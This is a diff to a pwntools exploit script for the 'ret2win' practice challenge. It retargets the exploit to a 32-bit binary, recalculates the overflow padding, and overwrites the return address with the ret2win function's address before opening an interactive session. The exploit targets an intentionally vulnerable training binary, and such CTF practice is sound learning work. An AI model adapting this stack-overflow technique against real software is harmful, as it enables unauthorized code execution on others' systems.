@@ -5,10 +5,11 @@ from pwn import *
 context.terminal = ['tmux', 'splitw', '-h']
 context.bits = 32
 gs = '''
+break pwnme
 continue
 '''
 
-elf = context.binary = ELF('./ret2win')
+elf = context.binary = ELF('./ret2win32')
 
 def start():
     if args.GDB:
@@ -22,8 +23,8 @@ r = start()
 
 #========= exploit here ===================
 
-junk = b'A'*32 + b'B'*8
-win = p64(0x00400764)
+junk = b'A'*40 + b'B'*4
+win = p32(elf.sym.ret2win)
 
 payload = junk
 payload += win
@@ -32,5 +33,3 @@ r.sendlineafter('>', payload)
 
 #========= interactive ====================
 r.interactive()
-
-#GDB not working properly
